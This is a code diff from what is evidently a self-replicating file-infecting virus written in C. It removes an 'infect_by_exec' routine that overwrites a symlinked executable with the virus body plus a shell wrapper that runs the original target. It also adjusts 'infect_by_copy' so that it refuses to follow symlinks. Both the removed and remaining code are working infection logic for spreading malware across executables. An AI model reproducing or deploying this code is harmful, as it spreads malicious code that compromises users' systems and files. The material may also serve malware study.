@@ -163,81 +163,13 @@ int is_possibly_infected(int fd, off_t size, off_t id_offset) {
     return memcmp(virus_id, buffer, sizeof(virus_id)) == 0;
 }
 
-int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
-    int result = 0;
-
-    char link[PATH_MAX];
-    ssize_t length = readlink(path, link, sizeof(link) - 1);
-    if (length < 0) {
-        result = errno;
-        goto exit;
-    }
-
-    char tmp_name[] = "XXXXXX";
-    int tmp_fd = mkstemp(tmp_name);
-    if (tmp_fd == -1) {
-        result = errno;
-        goto exit;
-    }
-
-    result = fchmod(tmp_fd, S_IRUSR | S_IXUSR);
-    if (result == -1) {
-        result = errno;
-        goto close_tmp;
-    }
-
-    static const char script_header[] = "#!/bin/sh\nexec ";
-    static const char script_footer[] = " $@\n";
-
-    result = posix_fallocate(
-        tmp_fd,
-        0,
-        virus_size + (sizeof(script_header) - 1) + length + (sizeof(script_footer) - 1));
-    if (result) {
-        goto close_tmp;
-    }
-    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
-
-    enum { count = 4 };
-    struct iovec iov[count] = {
-        {(void *) virus, virus_size},
-        {(void *) script_header, sizeof(script_header) - 1},
-        {link, length},
-        {(void *) script_footer, sizeof(script_footer) - 1},
-    };
-    if (writev_all(tmp_fd, iov, count) > 0) {
-        result = errno;
-        goto close_tmp;
-    }
-
-    result = fsync(tmp_fd);
-    if (result) {
-        result = errno;
-        goto close_tmp;
-    }
-
-    close(tmp_fd);
-    result = rename(tmp_name, path);
-    if (result) {
-        result = errno;
-        unlink(tmp_name);
-    }
-    goto exit;
-
-close_tmp:
-    close(tmp_fd);
-    unlink(tmp_name);
-
-exit:
-    return result;
-}
-
 int infect_by_copy(const char *virus, const virus_info_t *info, const char *path) {
     int result = 0;
 
-    int fd = open(path, O_RDONLY);
+    int fd = open(path, O_RDONLY | O_NOFOLLOW);
     if (fd == -1) {
-        return infect_by_exec(virus, info->size, path);
+        result = errno;
+        goto exit;
     }
 
     struct stat stat;
@@ -304,6 +236,7 @@ close_tmp:
 close_fd:
     close(fd);
 
+exit:
     return result;
 }
 
